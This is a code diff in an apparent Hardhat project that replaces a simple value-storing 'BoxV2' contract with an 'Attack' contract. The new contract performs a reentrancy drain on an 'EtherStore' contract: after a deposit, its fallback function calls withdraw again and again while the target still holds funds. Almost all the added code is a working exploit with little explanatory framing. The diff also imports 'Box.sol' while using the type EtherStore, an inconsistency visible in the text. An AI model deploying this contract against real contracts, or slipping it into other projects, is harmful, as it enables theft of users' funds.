@@ -2,25 +2,30 @@
 pragma solidity ^0.8.0;
 
 import "hardhat/console.sol";
+import "./Box.sol";
 
-contract BoxV2 {
-    uint256 private _value;
+contract Attack {
+    EtherStore public etherStore;
 
-    // Emitted when the stored value changes
-    event ValueChanged(uint256 value);
-
-    // Stores a new value in the contract
-    function store(uint256 value) public {
-        _value = value;
-        emit ValueChanged(value);
+    constructor(address _etherStoreAddress) {
+        etherStore = EtherStore(_etherStoreAddress);
     }
 
-    // Reads the last stored value
-    function retrieve() public view returns (uint256) {
-        return _value;
+    // Fallback is called when EtherStore sends Ether to this contract.
+    fallback() external payable {
+        if (address(etherStore).balance >= 1 ether) {
+            etherStore.withdraw();
+        }
     }
-   function increment() public {
-        _value = _value + 1;
-        emit ValueChanged(_value);
+
+    function attack() external payable {
+        require(msg.value >= 1 ether);
+        etherStore.deposit{value: 1 ether}();
+        etherStore.withdraw();
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint) {
+        return address(this).balance;
     }
 }
